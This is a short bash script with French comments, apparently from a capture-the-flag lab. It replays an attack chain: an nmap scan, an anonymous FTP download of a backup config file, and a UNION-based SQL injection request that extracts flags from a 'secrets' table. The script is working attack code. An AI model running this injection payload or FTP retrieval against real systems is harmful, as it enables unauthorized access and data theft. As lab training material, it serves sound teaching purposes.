#!/usr/bin/env bash
# Rejoue la chaîne d'attaque complète décrite dans la documentation :
# scan de ports -> FTP anonyme (flag 1 + indices) -> injection SQL (flag 2).
# Usage : ./scripts/simulate-attack.sh <cible>   (ex: localhost)
set -euo pipefail
T="${1:-localhost}"

echo "== 1. Reconnaissance réseau (nmap) =="
nmap -sV -p 21,80,22,3306,443,8080 "$T" || true

echo
echo "== 2. FTP anonyme : récupération du fichier de sauvegarde =="
ftp -inv "$T" <<FTP
user anonymous anonymous
cd pub/backup
get config.php.bak /tmp/config.php.bak
bye
FTP
echo "--- Contenu récupéré ---"
cat /tmp/config.php.bak
grep -o 'flag{[^}]*}' /tmp/config.php.bak

echo
echo "== 3. Injection SQL sur recherche.php (table secrets) =="
curl -s "http://$T/recherche.php?q=zzz%27%20UNION%20SELECT%20nom,valeur%20FROM%20secrets--%20-" \
  | grep -o 'flag{[^}]*}'
